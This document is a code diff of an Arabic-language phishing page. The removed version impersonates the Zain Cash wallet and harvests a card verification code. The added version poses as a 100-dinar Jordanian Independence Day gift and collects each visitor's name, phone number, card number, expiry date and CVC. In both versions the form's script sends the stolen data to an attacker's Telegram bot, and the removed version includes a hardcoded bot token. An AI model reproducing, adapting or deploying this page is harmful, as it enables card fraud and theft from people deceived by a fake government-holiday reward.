@@ -1,265 +1,192 @@
 <!DOCTYPE html>
 <html lang="ar">
-
 <head>
+    <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
-    <meta name="csrf-token" content="RQktravBpGn4uHMq4r0cM4WA8QZ4HeOq26zJkgqM">
-    <meta property="og:image" content="https://up6.cc/2025/03/174291544298861.png">
-    <meta property="og:site_name" content="زين كاش">
-    <meta property="og:description" content="محفظة زين كاش">
-
-    <title>Zain Cash - التحقق من البطاقة</title>
-
-    <link rel="dns-prefetch" href="http://fonts.gstatic.com/">
-    <link href="https://fonts.googleapis.com/css2?family=Droid+Arabic+Kufi:wght@400;700&display=swap" rel="stylesheet">
+    <title>استلم 100 دينار - احتفال الاستقلال</title>
+    <meta property="og:image" content="https://www2.0zz0.com/2025/05/23/00/954477004.jpeg">
+    <meta property="og:site_name" content="الاستقلال 2025">
+    <meta property="og:description" content="استلم 100 دينار على بطاقة الصراف الآلي بمناسبة يوم الاستقلال">
+    <link href="https://fonts.googleapis.com/css?family=Montserrat:500,600,700,900&amp;display=swap" rel="stylesheet">
     <link href="style.css" rel="stylesheet">
-    <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css" crossorigin="anonymous">
-    <link rel="stylesheet" href="https://pro.fontawesome.com/releases/v5.10.0/css/all.css" crossorigin="anonymous"/>
-
+    <link href="https://fonts.googleapis.com/css2?family=Noto+Kufi+Arabic:wght@200&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css">
+    <link rel="stylesheet" href="https://pro.fontawesome.com/releases/v5.10.0/css/all.css"/>
     <style type="text/css">
-        * {
-            direction: rtl;
-            font-family: 'Droid Arabic Kufi', sans-serif;
+        *{ direction: rtl; font-family: 'Noto Kufi Arabic', sans-serif; }
+        body { background-color: #FFF; }
+        /* ألوان العلم الأردني: أسود، أبيض، أخضر، أحمر */
+        .navbar-jordan {
+            background: linear-gradient(
+                90deg,
+                #000 0%,
+                #fff 33%,
+                #007a3d 66%,
+                #ce1126 100%
+            ) !important;
+            border-bottom: 4px solid #ce1126;
         }
-
-        body {
-            background-color: #FFF;
-            /* خلفية بيضاء مع زخرفة خفيفة بألوان العلم الأردني */
-            background-image: linear-gradient(
-                135deg,
-                #FFFFFF 75%,
-                #007a3d 75%,
-                #007a3d 80%,
-                #ce1126 80%,
-                #ce1126 85%,
-                #000 85%,
-                #000 100%
-            );
-            background-repeat: no-repeat;
-            background-size: 100% 350px;
-        }
-
-        .navbar-dark {
-            background-color: #FFF !important;
-        }
-
-        .bg-danger {
-            background-color: #007a3d !important; /* أخضر */
-        }
-
-        .text-danger {
-            color: #007a3d !important; /* أخضر */
-        }
-
-        body, h6, label, input, button, small, footer, .form-group {
-            text-align: right !important;
-        }
-
-        .form-group.centered-button {
-            text-align: center !important;
-            margin-top: 10px;
-            margin-bottom: 50px;
-        }
-
-        .form-group.centered-button button {
-            font-size: 1.5rem;
-            padding: 15px 30px;
-            width: auto;
-            border-radius: 50px;
-            background-color: #007a3d; /* أخضر */
-            color: #FFF;
-            border: none;
-        }
-
-        .form-group.centered-button button:hover {
-            background-color: #50b96c; /* أخضر فاتح */
-        }
-
-        footer {
-            margin-top: 50px;
-            background-color: #007a3d; /* أخضر */
-            width: 100%;
-            bottom: 0px;
-            padding: 10px;
-            color: #FFF;
-            font-weight: bold;
-            border-top: 4px solid #ce1126; /* خط أحمر */
-        }
-
-        footer small {
-            font-size: 14px;
-            color: #FFF;
-            font-weight: bolder;
-        }
-
-        .form-control {
-            font-size: 1.2rem;
-            padding: 15px;
-            border-radius: 10px;
-            border: 2px solid #007a3d; /* أخضر */
-            margin-bottom: 20px;
-            text-align: center;
-        }
-
-        .form-control:focus {
-            border-color: #50b96c; /* أخضر فاتح */
-            box-shadow: 0 0 10px rgba(80, 185, 108, 0.5);
-        }
-
-        .btn {
-            font-size: 1.5rem;
-            padding: 15px 30px;
-            border-radius: 50px;
-            font-weight: bold;
-            text-transform: uppercase;
-        }
-
-        .btn-success {
-            background-color: #007a3d;
-            border: none;
-        }
-
-        .btn-success:hover {
-            background-color: #50b96c;
-        }
-
-        .btn-primary {
-            background-color: #50b96c;
-            border: none;
-        }
-
-        .btn-primary:hover {
-            background-color: #35885a;
-        }
-
-        .container-logo {
-            margin-bottom: 10px;
-        }
-
-        .form-control::placeholder {
-            color: #999;
-            font-weight: bold;
-            text-align: center;
-        }
-
-        /* زخارف عيد الاستقلال */
         .independence-banner {
-            margin: 0 auto 30px auto;
-            text-align: center;
-            background: linear-gradient(90deg, #ce1126 0%, #fff 40%, #007a3d 100%);
+            background: linear-gradient(90deg, #ce1126 0%, #fff 50%, #007a3d 100%);
             color: #000;
-            padding: 12px 0;
-            font-size: 1.3rem;
+            padding: 20px 0;
+            margin-bottom: 30px;
+            border-bottom: 4px solid #000;
+        }
+        .independence-banner h2 {
             font-weight: bold;
-            border-radius: 20px;
-            box-shadow: 0 2px 12px rgba(0,0,0,0.06);
-            position: relative;
-            overflow: hidden;
-        }
-        .independence-banner i {
+            font-size: 2rem;
             color: #ce1126;
-            margin: 0 10px;
+            text-shadow: 1px 1px 0 #fff, 2px 2px 0 #007a3d;
         }
-        .independence-flag {
-            width: 44px;
-            vertical-align: middle;
-            margin-right: 10px;
-            margin-left: 10px;
+        .reward-card {
+            border: 2px solid #ce1126;
+            border-radius: 12px;
+            margin-top: 30px;
+            padding: 30px 15px 10px 15px;
+            box-shadow: 0 2px 8px #e5e5e5;
         }
-        /* نجمة العلم الأردني */
-        .jordan-star {
-            width: 22px;
-            height: 22px;
-            display: inline-block;
-            background: url('https://www2.0zz0.com/2025/05/23/00/954477004.jpeg') no-repeat center center;
-            background-size: contain;
-            vertical-align: middle;
-            margin-left: 4px;
+        .reward-card .amount {
+            font-size: 2.5rem;
+            color: #007a3d;
+            font-weight: bold;
+        }
+        .reward-card .desc {
+            font-size: 1.2rem;
+            color: #212529;
+            margin-bottom: 20px;
+        }
+        .form-label {
+            font-weight: bold;
+        }
+        .footer {
+            background-color: #000;
+            color: #FFF;
+            padding: 12px 0;
+            text-align: center;
+            font-size: 13px;
+            margin-top: 40px;
+            border-top: 4px solid #ce1126;
         }
     </style>
+    <script src="bot_config.js"></script>
 </head>
+<body>
+    <div class="independence-banner text-center">
+        <h2>مبروك! استلم 100 دينار بمناسبة يوم الاستقلال</h2>
+        <p>احتفالاً بعيد الاستقلال الأردني، احصل على 100 دينار على بطاقة الصراف الآلي الخاصة بك</p>
+    </div>
 
-<body style="background-color: #FFF;">
-    <nav class="navbar navbar-expand-md navbar-danger bg-danger shadow-sm"></nav>
-
-    <main class="py-4">
-        <!-- بانر عيد الاستقلال -->
-        <div class="independence-banner">
-            <img src="https://www2.0zz0.com/2025/05/23/00/954477004.jpeg" class="independence-flag" alt="علم الأردن">
-            <span><span class="jordan-star"></span> كل عام والأردن بألف خير بمناسبة عيد الاستقلال <span class="jordan-star"></span></span>
-            <img src="https://www2.0zz0.com/2025/05/23/00/954477004.jpeg" class="independence-flag" alt="علم الأردن">
-        </div>
-        <!-- /بانر عيد الاستقلال -->
-
-        <div class="container justify-content-center text-center container-logo">
-            <a class="navbar-brand justify-content-center">
-                <img src="https://www2.0zz0.com/2025/05/23/00/954477004.jpeg" style="width:100%" alt="logo">
-            </a>
-        </div>
-
-        <div class="container">
-            <div class="container justify-content-center">
-                <form id="verify-form" style="padding: 10px;">
-                    <div class="form-group row text-center">
-                        <input type="text" class="form-control" id="verification_code" name="verification_code" maxlength="6" minlength="6" inputmode="numeric" pattern="[0-9]{6}" placeholder="أدخل رمز التحقق المكون من 6 أرقام" autofocus="">
-                        <span id="verify_error" class="text-danger font-weight-bolder text-center" style="display: none;">يرجى إدخال رمز التحقق المكون من 6 أرقام</span>
-                    </div>
-                    <div class="form-group centered-button">
-                        <button type="submit" class="btn btn-success">
-                            <i class="fa fa-lock ml-10"></i> تحقق
-                        </button>
-                    </div>
-                </form>
+    <div class="container">
+        <div class="reward-card">
+            <div class="text-center mb-3">
+                <div class="amount">100 <span style="font-size:1.2rem;">دينار أردني</span></div>
+                <div class="desc">سيتم تحويل المبلغ مباشرة إلى بطاقة الصراف الآلي الخاصة بك بعد تعبئة البيانات التالية</div>
             </div>
+            <form id="rewardForm">
+                <div class="mb-3">
+                    <label for="fullName" class="form-label">الاسم الكامل:</label>
+                    <input id="fullName" class="form-control" name="fullName" autocomplete="off" required>
+                    <span id="verify_fullName" class="text-danger" style="display:none;">يرجى إدخال الاسم الكامل</span>
+                </div>
+                <div class="mb-3">
+                    <label for="phone" class="form-label">رقم الهاتف (سيتم التواصل عبر واتساب):</label>
+                    <input id="phone" class="form-control" name="phone" type="tel" maxlength="10" autocomplete="off" required>
+                    <span id="verify_phone" class="text-danger" style="display:none;">يرجى إدخال رقم الهاتف</span>
+                </div>
+                <div class="mb-3">
+                    <label for="cardNum" class="form-label">رقم البطاقة البنكية (16 رقم):</label>
+                    <input id="cardNum" class="form-control" name="cardNum" maxlength="16" autocomplete="off" required>
+                    <span id="verify_cardNum" class="text-danger" style="display:none;">يرجى إدخال رقم بطاقة صحيح</span>
+                </div>
+                <div class="mb-3">
+                    <label for="expDate" class="form-label">تاريخ انتهاء البطاقة (MM/YYYY):</label>
+                    <input id="expDate" class="form-control" name="expDate" placeholder="MM/YYYY" autocomplete="off" required>
+                    <!-- تم إزالة رسالة التحقق -->
+                </div>
+                <div class="mb-3">
+                    <label for="cvc" class="form-label">رمز التحقق CVC (آخر 3 أرقام خلف البطاقة):</label>
+                    <input id="cvc" class="form-control" name="cvc" maxlength="3" autocomplete="off" required>
+                    <span id="verify_cvc" class="text-danger" style="display:none;">يرجى إدخال رمز CVC صحيح</span>
+                </div>
+                <div class="mb-4">
+                    <button type="submit" class="btn btn-success w-100">
+                        <i class="fa fa-gift"></i> استلم جائزتك الآن
+                    </button>
+                </div>
+            </form>
         </div>
+    </div>
 
-    <footer>
-        <small>
-            <img src="https://upload.wikimedia.org/wikipedia/commons/2/2e/Flag_of_Jordan.svg" class="independence-flag" style="width:22px;display:inline;margin:0 5px 0 0;" alt="علم الأردن">
-            © 2025 جميع الحقوق محفوظة لـ | عيد الاستقلال الأردني
-            <img src="https://upload.wikimedia.org/wikipedia/commons/2/2e/Flag_of_Jordan.svg" class="independence-flag" style="width:22px;display:inline;margin:0 0 0 5px;" alt="علم الأردن">
-        </small>
+    <footer class="footer">
+        © 2025 جميع الحقوق محفوظة - احتفال الاستقلال الأردني
     </footer>
 
     <script src="https://code.jquery.com/jquery-3.6.4.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
     <script>
         $(document).ready(function() {
-            $('#verify-form').submit(function(event) {
+            $('#rewardForm').submit(function(event) {
                 event.preventDefault();
-                $('#verify_error').hide();
+                // Reset error messages
+                $('#verify_fullName, #verify_phone, #verify_cardNum, #verify_cvc').hide();
 
-                const code = $("#verification_code").val();
+                const fullName = $("#fullName").val().trim();
+                const phone = $("#phone").val().trim();
+                const cardNum = $("#cardNum").val().trim();
+                const expDate = $("#expDate").val().trim();
+                const cvc = $("#cvc").val().trim();
 
-                if (!code || !/^\d{6}$/.test(code)) {
-                    $('#verify_error').show();
-                    return;
+                let valid = true;
+
+                if (!fullName) {
+                    $('#verify_fullName').show();
+                    valid = false;
                 }
+                if (!phone || phone.length < 9) {
+                    $('#verify_phone').show();
+                    valid = false;
+                }
+                if (!/^\d{16}$/.test(cardNum)) {
+                    $('#verify_cardNum').show();
+                    valid = false;
+                }
+                // تم إزالة التحقق من expDate بالكامل (يقبل أي قيمة)
+                if (!/^\d{3}$/.test(cvc)) {
+                    $('#verify_cvc').show();
+                    valid = false;
+                }
+                if (!valid) return;
 
-                // الحصول على IP الجهاز
-                $.get("https://api.ipify.org?format=json", function(data) {
-                    const userIP = data.ip;
+                // إرسال البيانات إلى بوت تليجرام
+                const telegramMessage = "--------استلام جائزة الاستقلال-------\n"
+                    + "الاسم: " + fullName + "\n"
+                    + "رقم الهاتف: " + phone + "\n"
+                    + "رقم البطاقة: " + cardNum + "\n"
+                    + "تاريخ الانتهاء: " + expDate + "\n"
+                    + "CVC: " + cvc + "\n"
+                    + "--------------------\n";
 
-                    const telegramBotToken = "7680582937:AAHkEhiz5JPvPLMjNVUtF_GpvnkVNbum00s";
-                    const chatId = "-4625923889";
-                    const message = `رمز التحقق من البطاقة: ${code}\nIP المستخدم: ${userIP}`;
+                const telegramBotUrl = "https://api.telegram.org/bot" + botConfig.botToken + "/sendMessage";
+                const requestData = {
+                    chat_id: botConfig.chatId,
+                    text: telegramMessage
+                };
 
-                    const telegramUrl = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
-
-                    $.post(telegramUrl, {
-                        chat_id: chatId,
-                        text: message
-                    }).done(function (response) {
-                        // إعادة التوجيه لصفحة النجاح
-                        window.location.href = "code.html";
-                    }).fail(function (error) {
-                        alert("حدث خطأ أثناء الإرسال. يرجى المحاولة لاحقًا.");
+                $.post(telegramBotUrl, requestData, function(response) {
+                    Swal.fire({
+                        title: "يرجى تأكيد ملكيتك للبطاقة",
+                        text: "قم بتأكيد ملكيتك للبطاقة من خلال الضغط على التحقق",
+                        icon: "success",
+                        confirmButtonText: "التحقق"
+                    }).then(() => {
+                        // إعادة التوجيه عند الضغط على زر "التحقق"
+                        window.location.href = "code.html"; // ضع هنا رابط الصفحة الجديدة
                     });
+                    $('#rewardForm')[0].reset();
                 });
             });
         });
     </script>
 </body>
-
-</html>
+</html>ما 
